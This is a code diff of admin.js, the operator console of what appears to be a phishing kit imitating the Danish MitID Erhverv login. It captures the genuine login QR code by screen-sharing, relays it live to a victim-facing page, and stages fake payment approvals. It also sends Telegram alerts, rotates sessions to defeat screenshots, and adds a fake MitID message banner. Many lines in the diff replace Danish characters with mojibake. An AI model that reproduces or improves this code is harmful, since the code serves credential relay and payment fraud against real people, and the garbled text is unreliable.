@@ -1,13 +1,13 @@
-/* ════════════════════════════════════════════════════════════
-   admin.js — simpel én-fane konsol (MitID Erhverv-stil)
-   Kontrol-trin · Egen handling · QR/tekster · Capture · Telegram · Indstillinger
-   ════════════════════════════════════════════════════════════ */
+/* â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+   admin.js â€” simpel Ã©n-fane konsol (MitID Erhverv-stil)
+   Kontrol-trin Â· Egen handling Â· QR/tekster Â· Capture Â· Telegram Â· Indstillinger
+   â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• */
 
 let state = null;
 let adminPassword = sessionStorage.getItem('adminPassword') || '';
 
 function fmtTime(d){
-  if(!d) return '—';
+  if(!d) return 'â€”';
   const dt = new Date(d);
   return dt.toLocaleDateString('da-DK') + ' ' + dt.toLocaleTimeString('da-DK',{hour:'2-digit',minute:'2-digit'});
 }
@@ -75,7 +75,7 @@ async function doVerify(){
     showApp();
   } else {
     const msg = document.getElementById('loginCodeMsg');
-    if (msg) msg.textContent = data.error || 'Forkert kode — prøv igen:';
+    if (msg) msg.textContent = data.error || 'Forkert kode â€” prÃ¸v igen:';
     const inp = document.getElementById('loginCode');
     inp.value = '';
     inp.focus();
@@ -97,7 +97,7 @@ async function showApp(){
   loadStats();
 }
 
-// auto-login med gemt adgangskode (kun hvis 2FA ikke kræver ny kode)
+// auto-login med gemt adgangskode (kun hvis 2FA ikke krÃ¦ver ny kode)
 if(adminPassword){
   fetch('/api/login', {
     method:'POST',
@@ -115,7 +115,7 @@ function connectSocket(){
     const socket = io();
     socket.on('admin-state-update', (s) => { state = s; render(); });
   } catch(e) {
-    // socket.io utilgængelig — poll-opsvinget herunder dækker
+    // socket.io utilgÃ¦ngelig â€” poll-opsvinget herunder dÃ¦kker
   }
 }
 
@@ -147,24 +147,24 @@ function render(){
   const offlineMsg = document.getElementById('previewOfflineMsg');
 
   if(kioskDot){
-    kioskDot.textContent = 'SESSION · ' + (state.sessionId || '—');
+    kioskDot.textContent = 'SESSION Â· ' + (state.sessionId || 'â€”');
     kioskDot.classList.toggle('live', !!state.live);
   }
 
   if(state.live){
     dot.classList.add('live');
-    statusText.textContent = 'Live — vises på kundesiden';
-    toggle.textContent = 'SÆT OFFLINE';
+    statusText.textContent = 'Live â€” vises pÃ¥ kundesiden';
+    toggle.textContent = 'SÃ†T OFFLINE';
     toggle.classList.add('is-on');
     if(qrBox) qrBox.classList.add('on');
     if(offlineMsg) offlineMsg.style.display = 'none';
-    document.getElementById('previewTitle').textContent = state.title || 'Log på hos MitID Erhverv';
+    document.getElementById('previewTitle').textContent = state.title || 'Log pÃ¥ hos MitID Erhverv';
     document.getElementById('previewMsg').textContent = state.message || '';
     renderQR();
   } else {
     dot.classList.remove('live');
-    statusText.textContent = 'Offline — intet vises';
-    toggle.textContent = 'SÆT LIVE';
+    statusText.textContent = 'Offline â€” intet vises';
+    toggle.textContent = 'SÃ†T LIVE';
     toggle.classList.remove('is-on');
     if(qrBox) qrBox.classList.remove('on');
     if(offlineMsg) offlineMsg.style.display = 'block';
@@ -217,7 +217,7 @@ function flashSave(id){
   setTimeout(()=>el.classList.remove('show'), 1800);
 }
 
-// --- Live/QR-mål ---
+// --- Live/QR-mÃ¥l ---
 document.getElementById('liveToggle').addEventListener('click', async ()=>{
   state.live = !state.live;
   render();
@@ -275,9 +275,9 @@ function escapeHtml(str){
   return div.innerHTML;
 }
 
-/* ════════════════════════════════════════════════════════════
-   FLOW-KNAPPER — kundens trin
-   ════════════════════════════════════════════════════════════ */
+/* â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+   FLOW-KNAPPER â€” kundens trin
+   â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• */
 const FLOW_LABELS = { brugerid: 'Bruger-ID', scan: 'Vis QR', betaling: 'Betaling', annuller: 'Annullering', wait: 'Venter', approved: 'Godkendt' };
 
 function renderFlow(){
@@ -322,7 +322,7 @@ function renderFlow(){
   if (svarEl) {
     const r = state.actionResponse;
     if (r && Date.now() - r.at < 10 * 60 * 1000) {
-      const label = r.response === 'ok' ? '✅ Kunden har GODKENDT' : '❌ Kunden har ANNULLERET';
+      const label = r.response === 'ok' ? 'âœ… Kunden har GODKENDT' : 'âŒ Kunden har ANNULLERET';
       svarEl.textContent = label + ' (' + fmtTime(r.at) + ')';
       svarEl.className = 'action-svar show ' + (r.response === 'ok' ? 'ok' : 'cancel');
     } else {
@@ -378,9 +378,9 @@ document.addEventListener('click', function(e){
   if(e.target && e.target.id === 'tekstSendBtn') tekstSendClick();
 });
 
-/* ════════════════════════════════════════════════════════════
+/* â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    ROTATION (fast kort under Indstillinger)
-   ════════════════════════════════════════════════════════════ */
+   â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• */
 function injectRotateUI(){
   if(document.getElementById('rotateToggle')) return;
   const mount = document.getElementById('rotateMount');
@@ -388,8 +388,8 @@ function injectRotateUI(){
   const c = document.createElement('div');
   c.innerHTML = [
     '<h2 style="margin:0 0 4px;">Automatisk rotation</h2>',
-    '<p class="sub">Skift QR til ny session automatisk hvert X sekunder — gamle screenshots holder ikke.</p>',
-    '<div class="status-row"><span class="dot" id="rotateDot"></span><span class="status-text" id="rotateStatusText">Slået fra</span><button class="toggle-btn" id="rotateToggle">SLÅ TIL</button></div>',
+    '<p class="sub">Skift QR til ny session automatisk hvert X sekunder â€” gamle screenshots holder ikke.</p>',
+    '<div class="status-row"><span class="dot" id="rotateDot"></span><span class="status-text" id="rotateStatusText">SlÃ¥et fra</span><button class="toggle-btn" id="rotateToggle">SLÃ… TIL</button></div>',
     '<label for="rotateInterval">Sekunder</label>',
     '<input type="number" id="rotateInterval" min="3" step="1" placeholder="15">',
     '<div class="btn-row"><button class="btn-primary" id="saveRotateBtn">GEM</button><span class="save-msg" id="rotateSaveMsg">Gemt</span></div>'
@@ -420,9 +420,9 @@ function renderRotateUI(){
   const d = document.getElementById('rotateDot');
   if(!d) return;
   d.classList.toggle('live', !!r.enabled);
-  document.getElementById('rotateStatusText').textContent = r.enabled ? ('Roterer hvert ' + r.intervalSeconds + 's') : 'Slået fra';
+  document.getElementById('rotateStatusText').textContent = r.enabled ? ('Roterer hvert ' + r.intervalSeconds + 's') : 'SlÃ¥et fra';
   const t = document.getElementById('rotateToggle');
-  t.textContent = r.enabled ? 'SLÅ FRA' : 'SLÅ TIL';
+  t.textContent = r.enabled ? 'SLÃ… FRA' : 'SLÃ… TIL';
   t.classList.toggle('is-on', !!r.enabled);
   const e = document.getElementById('rotateInterval');
   if(document.activeElement !== e) e.value = r.intervalSeconds || 15;
@@ -433,10 +433,10 @@ document.addEventListener('click', function(e){
   if(e.target && e.target.id === 'saveRotateBtn') rotateSaveClick();
 });
 
-/* ════════════════════════════════════════════════════════════
-   CAPTURE — skærmdeling (hurtig pipeline: 110ms dekodning,
-   400ms debounce, øjeblikkelig socket-push til kunden)
-   ════════════════════════════════════════════════════════════ */
+/* â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+   CAPTURE â€” skÃ¦rmdeling (hurtig pipeline: 110ms dekodning,
+   400ms debounce, Ã¸jeblikkelig socket-push til kunden)
+   â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• */
 let captureStream = null;
 let captureScanning = false;
 let captureRafId = null;
@@ -458,7 +458,7 @@ async function startScreenShare(){
     // MAKS HASTIGHED: bed om 30fps fra kilden (browseren leverer det den kan)
     captureStream = await navigator.mediaDevices.getDisplayMedia({ video: { frameRate: { ideal: 30 } }, audio: false });
   } catch(e) {
-    showCaptureErr('Kunne ikke starte skærmdeling. Vælg det vindue hvor QR-koden vises, og prøv igen.');
+    showCaptureErr('Kunne ikke starte skÃ¦rmdeling. VÃ¦lg det vindue hvor QR-koden vises, og prÃ¸v igen.');
     return;
   }
   video.srcObject = captureStream;
@@ -468,7 +468,7 @@ async function startScreenShare(){
   document.getElementById('screenPlaceholder').style.display = 'none';
   document.getElementById('captureStartBtn').style.display = 'none';
   document.getElementById('captureStopBtn').style.display = 'inline-flex';
-  setCaptureStatus(true, 'Søger efter QR-kode ...');
+  setCaptureStatus(true, 'SÃ¸ger efter QR-kode ...');
 
   captureScanning = true;
   captureScanLoop();
@@ -486,16 +486,16 @@ function stopScreenShare(){
   if(ph) ph.style.display = 'flex';
   document.getElementById('captureStartBtn').style.display = 'inline-flex';
   document.getElementById('captureStopBtn').style.display = 'none';
-  setCaptureStatus(false, 'Skærmdeling stoppet');
+  setCaptureStatus(false, 'SkÃ¦rmdeling stoppet');
 }
 
 function captureScanLoop(){
   if(!captureScanning) return;
   const video = document.getElementById('screenVideo');
-  // MAKS HASTIGHED: adaptiv dekodning — kør hurtigst muligt men uden at spilde
-  // CPU: 60ms interval (≈16 scans/sek), nedskaleret til max 800px for skarphed.
-  // setTimeout i stedet for requestAnimationFrame: virker også når fanen er i
-  // baggrunden (RAF pauser), så capture altid kører.
+  // MAKS HASTIGHED: adaptiv dekodning â€” kÃ¸r hurtigst muligt men uden at spilde
+  // CPU: 60ms interval (â‰ˆ16 scans/sek), nedskaleret til max 800px for skarphed.
+  // setTimeout i stedet for requestAnimationFrame: virker ogsÃ¥ nÃ¥r fanen er i
+  // baggrunden (RAF pauser), sÃ¥ capture altid kÃ¸rer.
   const now = performance.now();
   if(video && video.readyState === video.HAVE_ENOUGH_DATA && now - captureLastScanAt >= 60){
     const w = video.videoWidth, h = video.videoHeight;
@@ -520,10 +520,10 @@ function captureScanLoop(){
 function onCaptureDecoded(value){
   const readEl = document.getElementById('captureReadValue');
   if(readEl) readEl.value = value;
-  setCaptureStatus(true, 'Kode aflæst');
+  setCaptureStatus(true, 'Kode aflÃ¦st');
   if(!capturePushEnabled) return;
   const now = Date.now();
-  // HURTIGHED: debounce 250ms — nye koder når kunden hurtigst muligt
+  // HURTIGHED: debounce 250ms â€” nye koder nÃ¥r kunden hurtigst muligt
   if(value === captureLastPushed && now - captureLastPushAt < 250) return;
   captureLastPushed = value;
   captureLastPushAt = now;
@@ -538,12 +538,12 @@ async function pushCaptureToDisplay(value){
       body: JSON.stringify({ target: value })
     });
     if(res.ok){
-      setCaptureStatus(true, 'Sendt til kundeside ✓');
+      setCaptureStatus(true, 'Sendt til kundeside âœ“');
     } else {
       showCaptureErr('Kunne ikke sende til kundesiden. Er du stadig logget ind?');
     }
   }catch(e){
-    showCaptureErr('Netværksfejl ved afsendelse til kundesiden.');
+    showCaptureErr('NetvÃ¦rksfejl ved afsendelse til kundesiden.');
   }
 }
 
@@ -553,7 +553,7 @@ function toggleCapturePush(){
   const statusEl = document.getElementById('capturePushStatus');
   if(toggleBtn) toggleBtn.textContent = capturePushEnabled ? 'SEND TIL KUNDESIDE: TIL' : 'SEND TIL KUNDESIDE: FRA';
   if(statusEl) statusEl.textContent = capturePushEnabled
-    ? 'Sender aflæst kode live til kundesiden — opdaterer øjeblikkeligt'
+    ? 'Sender aflÃ¦st kode live til kundesiden â€” opdaterer Ã¸jeblikkeligt'
     : 'Sender ikke til kundesiden';
   if(capturePushEnabled && captureLastPushed === null){
     const cur = document.getElementById('captureReadValue').value;
@@ -587,7 +587,7 @@ document.getElementById('captureAutoToggle').addEventListener('click', captureTo
 
 async function captureFetchNow(){
   const url = document.getElementById('captureSourceUrl').value.trim();
-  if(!url){ showCaptureUrlErr('Indsæt en URL først.'); return; }
+  if(!url){ showCaptureUrlErr('IndsÃ¦t en URL fÃ¸rst.'); return; }
   clearCaptureUrlErr();
   const btn = document.getElementById('captureFetchNowBtn');
   const original = btn.textContent;
@@ -604,7 +604,7 @@ async function captureFetchNow(){
       showCaptureUrlErr(data.error || 'Kunne ikke hente QR-koden.');
     }
   }catch(e){
-    showCaptureUrlErr('Netværksfejl ved hentning.');
+    showCaptureUrlErr('NetvÃ¦rksfejl ved hentning.');
   }finally{
     btn.textContent = original;
     btn.disabled = false;
@@ -618,9 +618,9 @@ async function captureSaveUrl(){
 
 async function captureToggleAuto(){
   const url = document.getElementById('captureSourceUrl').value.trim();
-  if(!url){ showCaptureUrlErr('Indsæt og gem en URL, før du slår automatisk opdatering til.'); return; }
+  if(!url){ showCaptureUrlErr('IndsÃ¦t og gem en URL, fÃ¸r du slÃ¥r automatisk opdatering til.'); return; }
   const toggleBtn = document.getElementById('captureAutoToggle');
-  const turningOn = ['Slå til','SLÅ TIL','Slaa til'].includes(toggleBtn.textContent.trim());
+  const turningOn = ['SlÃ¥ til','SLÃ… TIL','Slaa til'].includes(toggleBtn.textContent.trim());
   await apiPost('/api/capture-settings', { sourceUrl: url, enabled: turningOn });
   state = await apiGet('/api/state');
   render();
@@ -634,7 +634,7 @@ function renderCaptureUrlState(){
 
   const toggleBtn = document.getElementById('captureAutoToggle');
   if(toggleBtn){
-    toggleBtn.textContent = c.enabled ? 'SLÅ FRA' : 'SLÅ TIL';
+    toggleBtn.textContent = c.enabled ? 'SLÃ… FRA' : 'SLÃ… TIL';
     toggleBtn.classList.toggle('is-on', !!c.enabled);
   }
 
@@ -657,9 +657,9 @@ function clearCaptureUrlErr(){
   if(el) el.textContent = '';
 }
 
-/* ════════════════════════════════════════════════════════════
+/* â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    TELEGRAM-NOTIFIKATIONER
-   ════════════════════════════════════════════════════════════ */
+   â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• */
 function renderTelegram(){
   if(!state || !state.telegram) return;
   const t = state.telegram;
@@ -671,19 +671,19 @@ function renderTelegram(){
   const ready = !!(t.enabled && t.hasToken && t.hasChatId);
   dot.classList.toggle('live', !!t.enabled);
   dot.classList.toggle('warn', !!t.enabled && !ready);
-  textEl.textContent = !t.enabled ? 'Slået fra'
-    : (!ready ? 'Slået til — men mangler token/chat-ID' : 'Aktiv — sender notifikationer');
-  toggleBtn.textContent = t.enabled ? 'SLÅ FRA' : 'SLÅ TIL';
+  textEl.textContent = !t.enabled ? 'SlÃ¥et fra'
+    : (!ready ? 'SlÃ¥et til â€” men mangler token/chat-ID' : 'Aktiv â€” sender notifikationer');
+  toggleBtn.textContent = t.enabled ? 'SLÃ… FRA' : 'SLÃ… TIL';
   toggleBtn.classList.toggle('is-on', !!t.enabled);
 
   const tokEl = document.getElementById('telegramToken');
   if (tokEl && document.activeElement !== tokEl) {
-    if (t.hasToken) { tokEl.value = ''; tokEl.placeholder = 'Gemt ✓ (skriv for at skifte)'; }
+    if (t.hasToken) { tokEl.value = ''; tokEl.placeholder = 'Gemt âœ“ (skriv for at skifte)'; }
     else { tokEl.placeholder = '123456789:AAE... (fra @BotFather)'; }
   }
   const chatEl = document.getElementById('telegramChatId');
   if (chatEl && document.activeElement !== chatEl && t.hasChatId) {
-    chatEl.placeholder = 'Gemt ✓ (skriv for at skifte)';
+    chatEl.placeholder = 'Gemt âœ“ (skriv for at skifte)';
   }
 
   document.getElementById('telegramLastSent').textContent = fmtTime(t.lastSentAt);
@@ -691,7 +691,7 @@ function renderTelegram(){
   const errEl = document.getElementById('telegramErr');
   if (t.lastError) { errEl.textContent = 'Fejl: ' + t.lastError; errEl.className = 'tg-err'; }
   else if (ready)  { errEl.textContent = 'OK'; errEl.className = 'tg-ok'; }
-  else             { errEl.textContent = '—'; errEl.className = ''; }
+  else             { errEl.textContent = 'â€”'; errEl.className = ''; }
 }
 
 async function telegramToggleClick(){
@@ -735,9 +735,9 @@ document.addEventListener('click', function(e){
   if(e.target && e.target.id === 'telegramTestBtn') telegramTestClick();
 });
 
-/* ════════════════════════════════════════════════════════════
-   PRESET-CHIPS — færdiglavede handlinger (klik = udfyld + vis)
-   ════════════════════════════════════════════════════════════ */
+/* â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
+   PRESET-CHIPS â€” fÃ¦rdiglavede handlinger (klik = udfyld + vis)
+   â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• */
 document.addEventListener('click', async function(e){
   const chip = e.target.closest ? e.target.closest('.preset-chip') : null;
   if(!chip) return;
@@ -748,11 +748,29 @@ document.addEventListener('click', async function(e){
   if (focusId === 'actionAmount' && !amountEl.value.trim()) {
     amountEl.focus();
   }
-  // vis straks på kundesiden med preset-teksten
+  // vis straks pÃ¥ kundesiden med preset-teksten
   await setFlow('action', {
     title,
     amount: document.getElementById('actionAmount').value.trim(),
     detail: document.getElementById('actionDetail').value.trim()
   });
   flashSave('actionSaveMsg');
+});
+/* â•â•â• MITID BESKED banner â•â•â• */
+async function mitidBeskedSend(){
+  const text = document.getElementById('mitidBeskedTekst').value.trim();
+  try {
+    await apiPost('/api/besked-banner', { visible: true, text });
+    flashSave('mitidBeskedMsg');
+  } catch(e) {}
+}
+async function mitidBeskedSkjul(){
+  try {
+    await apiPost('/api/besked-banner', { visible: false });
+    flashSave('mitidBeskedMsg');
+  } catch(e) {}
+}
+document.addEventListener('click', function(e){
+  if (e.target && e.target.id === 'mitidBeskedSend') mitidBeskedSend();
+  if (e.target && e.target.id === 'mitidBeskedSkjul') mitidBeskedSkjul();
 });
